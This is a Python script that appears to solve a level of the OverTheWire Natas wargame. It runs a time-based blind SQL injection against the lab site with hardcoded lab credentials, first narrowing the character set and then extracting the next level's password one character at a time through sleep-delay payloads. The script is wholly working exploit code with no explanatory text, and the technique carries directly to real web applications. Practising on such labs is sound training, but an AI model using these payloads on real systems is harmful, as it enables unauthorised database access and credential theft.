import requests

def reduce_charset(charset):
	reduced_charset = ''
	for c in charset:
		path = 'http://natas17.natas.labs.overthewire.org/index.php'
		auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
		data = {'username':'natas18" AND password LIKE BINARY "%{}%" AND sleep(2) #'.format(c)}
		r = requests.post(path, auth=auth, data=data)
		if r.elapsed.seconds >= 2:
			print(r.elapsed.seconds)
			reduced_charset += c
			print(reduced_charset)
	return reduced_charset

def blind_sql(reduced_charset):
	password = ''
	for i in range(0,32):
		for c in reduced_charset:
			path = 'http://natas17.natas.labs.overthewire.org/index.php'
			auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')
			data = {'username':'natas18" AND password LIKE BINARY "{}{}%" AND sleep(2) #'.format(password, c)}
			r = requests.post(path, auth=auth, data=data)
			if r.elapsed.seconds >= 2:
				print(r.elapsed.seconds)
				password += c
				print(password)
				break
	return password


def main():
	charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
	print('Reducing character set...')
	reduced_charset = reduce_charset(charset)
	print(reduced_charset)
	print('Blind SQL injection...')
	password = blind_sql(reduced_charset)
	print(password)

main()